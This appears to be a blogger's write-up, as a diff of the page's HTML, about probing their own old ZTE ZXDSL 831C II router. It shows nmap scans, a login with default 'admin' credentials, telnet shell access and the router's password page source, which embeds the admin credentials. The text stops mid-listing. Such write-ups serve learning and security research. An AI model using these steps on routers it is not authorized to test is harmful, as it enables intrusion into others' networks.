@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>How I hacked my first router - Omer&#39;s Blog</title><meta name="Description" content="This my personal blog where I write about Tech"><meta property="og:title" content="How I hacked my first router" />
+<meta property="og:description" content="How I Hacked My First Router I have never found a real vulnerability in the &ldquo;real world&rdquo; before. I was just playing CTFs and Wargames. One day I was looking through our old stuff, and I stumbled up on this router the ZTE - ZXDSL 831C II, and had heard before that this router has a vulnerability. So I thought this would be the perfect chance. I set it up and started pwning." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://omer-biz.github.io/posts/how_i_hacked_my_first_router/" />
+<meta property="article:published_time" content="2021-01-03T21:06:22+03:00" />
+<meta property="article:modified_time" content="2021-01-03T21:06:22+03:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="How I hacked my first router"/>
+<meta name="twitter:description" content="How I Hacked My First Router I have never found a real vulnerability in the &ldquo;real world&rdquo; before. I was just playing CTFs and Wargames. One day I was looking through our old stuff, and I stumbled up on this router the ZTE - ZXDSL 831C II, and had heard before that this router has a vulnerability. So I thought this would be the perfect chance. I set it up and started pwning."/>
+<meta name="application-name" content="Omer&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Omer&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://omer-biz.github.io/posts/how_i_hacked_my_first_router/" /><link rel="prev" href="https://omer-biz.github.io/posts/remap-capslock-to-escape-and-ctrl/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "How I hacked my first router",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/omer-biz.github.io\/posts\/how_i_hacked_my_first_router\/"
+        },"genre": "posts","keywords": "hacking, router, ZTE, exploit","wordcount":  1402 ,
+        "url": "https:\/\/omer-biz.github.io\/posts\/how_i_hacked_my_first_router\/","datePublished": "2021-01-03T21:06:22+03:00","dateModified": "2021-01-03T21:06:22+03:00","publisher": {
+            "@type": "Organization",
+            "name": "Omer"},"author": {
+                "@type": "Person",
+                "name": "Omer"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Omer&#39;s Blog">Omer&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Home Page"> Home </a><a class="menu-item" href="/posts/" title="Blog Posts"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Omer&#39;s Blog">Omer&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Home Page">Home</a><a class="menu-item" href="/posts/" title="Blog Posts">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">How I hacked my first router</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Omer</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hacking/"><i class="far fa-folder fa-fw"></i>Hacking</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-03">2021-01-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1402 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scannig-with-nmap">Scannig with Nmap</a></li>
+    <li><a href="#results">Results</a>
+      <ul>
+        <li><a href="#port-80">Port 80</a></li>
+        <li><a href="#port-23">Port 23</a></li>
+      </ul>
+    </li>
+    <li><a href="#finding-the-vulnerability">Finding The Vulnerability</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="how-i-hacked-my-first-router">How I Hacked My First Router</h1>
+<p>I have never found a real vulnerability in the &ldquo;real world&rdquo; before. I was just playing CTFs and
+Wargames. One day I was looking through our old stuff, and I stumbled up on this router the
+<code>ZTE - ZXDSL 831C II</code>,
+and had heard before that this router has a vulnerability. So I thought this would be the perfect chance.
+I set it up and started pwning.</p>
+<h2 id="scannig-with-nmap">Scannig with Nmap</h2>
+<p>Once every hacker is on a network, it&rsquo;s obvious what they do, they always run nmap. Let&rsquo;s run nmap scan
+on the router and save the result to a file. We will perform a service scan, and also run the default scripts. Will
+use <code>sudo</code> to make nmap go faster.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -oA router.txt 192.168.1.1
+</code></pre></td></tr></table>
+</div>
+</div><p>While we check for the result it&rsquo;s a good idea to run another scan of all ports.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -p- -oA router_allports.txt 192.168.1.1
+</code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s inspect the output of the first command.</p>
+<h2 id="results">Results</h2>
+<p>The result of the first nmap scan looks like this.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_19-55.png"
+        data-srcset="./pic/2021-01-04_19-55.png, ./pic/2021-01-04_19-55.png 1.5x, ./pic/2021-01-04_19-55.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_19-55.png"
+        title="nmap scan" /></p>
+<h3 id="port-80">Port 80</h3>
+<p>In the scan we can see that there are some ports open. Let&rsquo;s inspect port 80 first.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-03.png"
+        data-srcset="./pic/2021-01-04_20-03.png, ./pic/2021-01-04_20-03.png 1.5x, ./pic/2021-01-04_20-03.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-03.png"
+        title="login" /></p>
+<p>It appears to be a web interface. The defualt username and password is <code>admin</code>,
+put that in and you will get this. Now my target shifted to being
+able to gain the source code of this web application.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-05.png"
+        data-srcset="./pic/2021-01-04_20-05.png, ./pic/2021-01-04_20-05.png 1.5x, ./pic/2021-01-04_20-05.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-05.png"
+        title="web iface" /></p>
+<p>We will use the managemnt tab to change the username and password to demonstrate the attack.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-06.png"
+        data-srcset="./pic/2021-01-04_20-06.png, ./pic/2021-01-04_20-06.png 1.5x, ./pic/2021-01-04_20-06.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-06.png"
+        title="managemnt page" /></p>
+<h3 id="port-23">Port 23</h3>
+<p>If we go back to our nmap scan we see that there is a port 23 open which is telnet, and uses
+the same username and password as the web application. We can use the following command to
+login.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">telnet 192.168.1.1 <span class="m">23</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-08.png"
+        data-srcset="./pic/2021-01-04_20-08.png, ./pic/2021-01-04_20-08.png 1.5x, ./pic/2021-01-04_20-08.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-08.png"
+        title="telnet" /></p>
+<p>After logging in you can issue some command to manage the router, and if you type in <code>help</code>
+you will get a list of commands you can use. I was interested in the <code>sh</code> command which will
+give you a linux shell.</p>
+<p>After getting a shell I immediately run the <code>ls</code> command to see what&rsquo;s there.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-10.png"
+        data-srcset="./pic/2021-01-04_20-10.png, ./pic/2021-01-04_20-10.png 1.5x, ./pic/2021-01-04_20-10.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-10.png"
+        title="running ls" /></p>
+<p>This is a listing of the root directory. The directory I was particularly interested in was
+the <code>webs</code> directory. I went into the <code>webs</code> directory and searched for any file which
+contains the <code>passwd</code> word in it and I found two.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-11.png"
+        data-srcset="./pic/2021-01-04_20-11.png, ./pic/2021-01-04_20-11.png 1.5x, ./pic/2021-01-04_20-11.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-11.png"
+        title="passwd" /></p>
+<p>You can <code>cat</code> the contents of any file in this directory.</p>
+<h2 id="finding-the-vulnerability">Finding The Vulnerability</h2>
+<p>I was interested in the contents of the <code>adminpasswd.html</code>. Here is the source code.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&#39;Pragma&#39;</span> <span class="na">CONTENT</span><span class="o">=</span><span class="s">&#39;no-cache&#39;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=iso-8859-1&#34;</span> <span class="p">/&gt;</span>
+        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;stylemain.css&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;colors.css&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;util.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="p">&gt;</span>
+<span class="c">&lt;!--</span> <span class="nx">hide</span>
+
+<span class="nx">nameAdmin</span> <span class="o">=</span> <span class="s1">&#39;&lt;%ejGet(sysUserName)%&gt;&#39;</span><span class="p">;</span>
+<span class="nx">pwdAdmin</span> <span class="o">=</span> <span class="s1">&#39;&lt;%ejGet(sysPassword)%&gt;&#39;</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">frmLoad</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kd">with</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">nameAdmin</span><span class="p">;</span>
+        <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pwdAdmin</span><span class="p">;</span>
+        <span class="nx">cfmPwd</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pwdAdmin</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">btnApplyAdmin</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">loc</span> <span class="o">=</span> <span class="s1">&#39;adminpasswd.cgi?action=save&amp;&#39;</span><span class="p">;</span>
+    <span class="kd">with</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span>  <span class="s1">&#39;&lt;%ejGet(usrUserName)%&gt;&#39;</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Don&#39;t make such names!Please change it!\n &#34;</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+                
+                        <span class="k">if</span> <span class="p">(</span> <span class="nx">isIncludeInvalidChar</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">)</span> 
+                <span class="p">{</span>
+                 <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Invalide characters in user name.&#39;</span><span class="p">);</span>
+                 <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+
+                <span class="k">if</span> <span class="p">(</span> <span class="nx">isIncludeInvalidChar</span><span class="p">(</span><span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">)</span> 
+                <span class="p">{</span>
+                 <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Invalide characters in password.&#39;</span><span class="p">);</span>
+                 <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> 
+        <span class="p">{</span>
+             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Account and Password can\&#39;t be empty.&#39;</span><span class="p">);</span>
+             <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>        
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> 
+        <span class="p">{</span>
+             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Accout can\&#39;t contain a space.&#39;</span><span class="p">);</span>
+             <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Password can\&#39;t contain a space.&#39;</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">alert</span><span class="p">(</span> <span class="s1">&#39;Admin  Account  should not be longer the 15 characters!&#39;</span> <span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">32</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">alert</span> <span class="p">(</span><span class="s1">&#39;Password should not be longer than 32 characters.&#39;</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span> <span class="o">!=</span> <span class="nx">cfmPwd</span><span class="p">.</span><span class="nx">value</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;The passwords do not match.&#34;</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> 
+        <span class="p">{</span>
+             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Accout and Password cannot be empty.&#39;</span><span class="p">);</span>
+             <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nx">loc</span> <span class="o">+=</span> <span class="s1">&#39;sysUserName=&#39;</span> <span class="o">+</span> <span class="nx">encodeUrl</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">;</span>
+        <span class="nx">loc</span> <span class="o">+=</span> <span class="s1">&#39;sysPassword=&#39;</span> <span class="o">+</span> <span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">encodeUrl</span><span class="p">(</span><span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span> <span class="c1">//lvwz
+</span><span class="c1"></span>        
+        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="s1">&#39;location.assign(&#34;&#39;</span> <span class="o">+</span> <span class="nx">loc</span> <span class="o">+</span> <span class="s1">&#39;&#34;)&#39;</span><span class="p">;</span>
+        <span class="nb">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
+        
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="o">--&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onLoad</span><span class="o">=</span><span class="s">&#39;frmLoad()&#39;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>Admin Account<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">cellSpacing</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">cellPadding</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">TR</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;590&#34;</span><span class="p">&gt;</span>Admin account has unrestricted access to change and view configuration of your ADSL<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span> router. <span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">cellSpacing</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">cellPadding</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;150&#34;</span><span class="p">&gt;</span>User Name:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;63&#34;</span>  <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>   <span class="na">name</span><span class="o">=</span><span class="s">&#34;sysUserName&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;</span>New Password:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;32&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;sysPassword&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;</span>Confirm New Password:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;32&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;cfmPwd&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
